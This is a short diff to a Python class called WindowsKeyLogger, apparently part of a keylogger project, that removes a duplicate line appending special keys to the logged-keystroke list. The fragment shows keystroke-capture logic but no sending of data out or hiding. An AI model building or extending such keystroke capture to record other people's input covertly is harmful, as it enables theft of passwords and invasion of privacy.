@@ -27,7 +27,6 @@ class WindowsKeyLogger(IKeyLogger):
                 keyboard.Key.esc: "ESCAPE"
             }
             key_str = special_keys.get(key, str(key)) # convert special keys to string
-            self.logged_keys.append(special_keys.get(key, str(key))) 
              
         self.logged_keys.append(key_str)
         # TODO: Write only if there is a timeout
